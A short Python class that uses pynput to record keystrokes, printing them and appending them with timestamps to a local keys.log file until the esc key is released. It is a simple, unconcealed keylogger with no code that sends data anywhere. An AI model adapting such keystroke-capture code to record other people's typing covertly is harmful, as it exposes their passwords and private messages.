from pynput import keyboard
from datetime import datetime

class Key:
    def __init__(self) -> None:
        self.__str_key = ''
        self.__word = ''
        self.__key_break = 'esc'
        self.use_key_break = True
        self.file_path = 'keys.log'

    def pressed(self, key) -> None:
        self.__key_format(key)
        self.__word += self.__str_key
        print(self.__word)
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            self.__save_word()

    def released(self, key) -> bool:
        if self.use_key_break and key == keyboard.Key[self.get_key_break()]:
            if len(self.__word) > 0:
                self.__save_word()
            return False
        else:
            return True

    def get_key_break(self) -> str:
        return self.__key_break

    def set_key_break(self, key_break: str) -> None:
        self.__key_break = key_break

    def __key_format(self, key) -> None:
        self.__str_key = str(key).replace("'", '')
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            self.__str_key = ''.join(('\n', datetime.utcnow().strftime('%d-%m-%Y %H:%M:%S'), '\n'))
        elif self.__str_key.find('Key.') != -1:
            self.__str_key = ''
        else:
            pass

    def __save_word(self) -> None:
        with open(self.file_path, 'at') as f:
            f.write(self.__word)
        self.__word = ''
